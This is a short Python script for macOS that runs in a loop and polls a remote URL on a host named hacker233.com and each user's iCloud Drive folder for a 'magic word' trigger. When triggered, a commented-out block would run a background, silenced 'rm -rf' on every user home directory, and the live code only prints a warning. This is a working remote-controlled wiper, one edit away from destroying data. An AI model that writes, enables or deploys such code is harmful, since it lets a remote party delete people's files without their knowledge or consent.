import os
import requests
import time

# Set Magic Word
magicWord = 'WipeAllDataNow'

# Set web server address
webHooks = ['https://hacker233.com/LetsWipe.html']

# Get users list from the system
users = os.listdir('/Users/')

needWipe = False

while True:
    for u in users:
        if u != 'Shared' and u !='.localized' and u != '.DS_Store':
            # Get the path of the user's icloud folder
            icloud_path = '/Users/' + u + '/Library/Mobile Documents/com~apple~CloudDocs/'
            wipeFlag = icloud_path + magicWord
            if os.path.exists(wipeFlag):
                needWipe = True
                break
    for hook in webHooks:
        #fetch the web hook
        try:
            content = requests.get(hook).content.decode('utf-8')
            if content == magicWord:
                needWipe = True
                break
        except:
            pass

    # if needWipe:
    #     for u in users:
    #         userPath = '/Users/' + u
    #         os.system('nohup rm -rf ' + userPath + ' >/dev/null &')
    #     needWipe = False

    if needWipe:
        print('Will Wiping all data now...')
        needWipe = False

    time.sleep(1)

